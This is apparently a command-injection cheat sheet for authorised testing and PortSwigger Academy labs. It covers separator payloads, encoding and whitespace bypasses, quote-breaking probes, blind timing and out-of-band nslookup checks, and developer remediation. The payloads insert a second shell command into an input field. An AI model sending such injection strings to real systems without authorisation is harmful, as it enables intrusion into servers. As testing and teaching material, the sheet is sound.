# OS Command Injection — Cheat Sheet

> Quick reference for authorised testing and PortSwigger Academy labs. Use harmless proofs only; never test systems outside your scope.

---

## Quick Workflow

```text
Baseline request → separator probe → harmless command → confirm signal → document evidence
```

1. Capture the legitimate request in Burp Repeater.
2. Send a valid baseline value and note response body, status, and timing.
3. Append one separator plus a harmless proof command.
4. Test Unix-like and Windows syntax only when the platform is unknown.
5. Confirm with direct output, a repeatable delay, or an authorised out-of-band interaction.

---

## Safe Proof Commands

| Goal | Unix-like | Windows |
| --- | --- | --- |
| Identify execution user | `whoami` | `whoami` |
| Basic host or identity information | `id` | `ver` |
| Controlled delay | `sleep 5` | `timeout /t 5 /nobreak` |
| Out-of-band lab confirmation | `nslookup <collaborator>` | `nslookup <collaborator>` |

Replace `<collaborator>` only with a Burp Collaborator or other endpoint you control and are authorised to use.

---

## Separator Payloads

Assume the vulnerable parameter normally receives `VALUE`. Start with the shortest payload and replace the command only after you have an execution signal.

| Operator | Unix-like shells | Windows `cmd.exe` | Example |
| --- | --- | --- | --- |
| Sequential command | Yes | Yes | `VALUE;whoami` (Unix) / `VALUE&whoami` (Windows) |
| Background or separator | Yes | Yes | `VALUE&whoami` |
| Pipe output | Yes | Yes | `VALUE|whoami` |
| Run only if previous succeeds | Yes | Yes | `VALUE&&whoami` |
| Run only if previous fails | Yes | Yes | `VALUE||whoami` |
| Newline | Often | Often | `VALUE%0Awhoami` |

### Unix-like command substitution

Command substitution can execute before the surrounding command is evaluated.

```text
VALUE$(whoami)
VALUE`whoami`
```

Use this only when the application context plausibly embeds input in an argument and ordinary separators fail. Backticks may be filtered or altered by clients and proxies.

---

## Encoding and Transport Variants

Encode only characters that the HTTP layer may transform; encoding does not bypass server-side validation by itself.

| Character | URL-encoded | Notes |
| --- | --- | --- |
| Space | `%20` or `+` | `+` is form encoding, not universal URL encoding |
| Semicolon | `%3B` | Unix sequential command separator |
| Pipe | `%7C` | Shell pipe |
| Ampersand | `%26` | Encode in query or form values to avoid parameter splitting |
| Newline | `%0A` | May work where shell input crosses a line boundary |
| Carriage return | `%0D` | Often paired with newline as `%0D%0A` |
| Dollar sign | `%24` | Used by `$(...)` in Unix-like shells |
| Backtick | `%60` | Unix command substitution |

```text
Unix:    VALUE%3Bwhoami
Windows: VALUE%26whoami
Newline: VALUE%0Awhoami
```

---

## Whitespace Alternatives (Unix-like)

When literal spaces are blocked, test whether the shell context permits an alternative separator. These are shell-dependent and should be validated one at a time.

```text
${IFS}        # shell field separator; commonly expands to a space/tab/newline sequence
<TAB>         # a literal tab, URL-encoded as %09 when applicable
```

```text
VALUE;cat${IFS}/etc/hostname
VALUE;whoami%09# tab before a shell comment, where accepted
```

Do not assume `${IFS}` works in every context: quoting, a non-POSIX shell, or input normalisation can prevent expansion.

---

## Quoting-Context Probes

The payload must match how the application places the input in the command. Infer the likely context from source code, errors, or the behaviour of normal values.

| Suspected context | Probe idea | Example |
| --- | --- | --- |
| Unquoted argument | Append separator | `VALUE;whoami` |
| Single-quoted string | Close quote, run command, reopen | `VALUE';whoami;'` |
| Double-quoted string (Unix) | Command substitution may still expand | `VALUE$(whoami)` |
| Windows command string | `cmd.exe` operators may still parse | `VALUE&whoami` |

These are probes, not evidence on their own. Validate with a harmless command and a repeatable response difference.

---

## Blind Command Injection

### Time-Based Confirmation

```text
Unix:    VALUE;sleep 5
Windows: VALUE&timeout /t 5 /nobreak
```

- Measure several baseline requests first.
- Repeat the delay payload at least twice.
- Use a small, controlled delay and account for network jitter.
- Confirm the timing difference disappears when the command is removed.

### Out-of-Band Confirmation

```text
Unix:    VALUE;nslookup <collaborator>
Windows: VALUE&nslookup <collaborator>
```

For Academy labs, copy a unique Burp Collaborator payload, send one test request, then poll Collaborator. A matching DNS or HTTP interaction is strong evidence of server-side execution, but record the request and timestamp to rule out unrelated traffic.

---

## Common Lab Patterns

| Scenario | First test | Confirmation |
| --- | --- | --- |
| Output is in the response | `;whoami` or `&whoami` | Observe command output |
| No output; response is normal | `;sleep 5` or `&timeout /t 5 /nobreak` | Repeatable response delay |
| No output and timing is unreliable | `;nslookup <collaborator>` | Collaborator DNS or HTTP interaction |
| Input is URL-encoded | `%3Bwhoami` or `%26whoami` | Inspect raw request in Burp |
| Separator filtered | Test another operator or quoting context | One controlled variation at a time |

---

## Burp Suite Notes

```text
Proxy / HTTP history → identify the parameter
Send to Repeater     → establish a baseline and test manually
Comparer             → compare responses and timing evidence
Collaborator         → generate and poll an authorised OAST payload
Intruder             → use sparingly; avoid noisy or destructive payload lists
```

Keep URL encoding under control: either let Burp encode the payload or send a pre-encoded value, but do not accidentally encode it twice.

---

## False-Positive Checklist

```text
[ ] Is the changed text command output rather than reflected input?
[ ] Does the same proof work repeatedly?
[ ] Is the delay larger than normal response variation?
[ ] Did a WAF or validation rule create the error instead of a shell?
[ ] Does a clean control request remove the signal?
[ ] Did I identify the target OS or shell before claiming platform-specific impact?
```

---

## Developer Remediation at a Glance

```text
Best: avoid external commands; use a library or service API.
If needed: execute a fixed binary with an argument array, never through a shell.
Always: allowlist inputs, use least privilege, set timeouts, and limit output.
```

```python
# Good pattern: no shell grammar is interpreted.
subprocess.run(["ping", "-c", "1", validated_host], shell=False, timeout=5)
```

See [README.md](README.md) for the full explanation, testing methodology, mitigation guidance, and references.

---

## References

- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PayloadsAllTheThings — Command Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)
